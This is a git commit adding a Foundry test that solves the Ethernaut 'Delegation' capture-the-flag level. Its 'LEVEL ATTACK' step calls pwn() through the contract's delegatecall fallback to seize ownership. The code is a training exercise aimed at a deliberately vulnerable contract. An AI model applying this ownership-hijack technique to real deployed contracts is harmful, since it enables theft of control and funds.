802de49ab6022c1959e91ffbf2c4f4038edcd46b
DDEENNY <a39955720@gmail.com>
2025-02-07 19:24:48 +0800

    06-Delegation

---
+++ test/Delegation.t.sol
@@ -0,0 +1,41 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.27;
+
+import {Test, console} from "forge-std/Test.sol";
+import {StdCheats} from "forge-std/StdCheats.sol";
+import "../src/Delegation/DelegationFactory.sol";
+import "../src/Ethernaut.sol";
+
+contract DelegationTest is StdCheats, Test {
+    Ethernaut ethernaut;
+
+    function setUp() public {
+        // Setup instance of the Ethernaut contract
+        ethernaut = new Ethernaut();
+    }
+
+    function testDelegationHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+
+        DelegationFactory delegationFactory = new DelegationFactory();
+        ethernaut.registerLevel(delegationFactory);
+        vm.startPrank(tx.origin);
+        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
+        Delegation ethernautDelegation = Delegation(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+        (bool success,) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
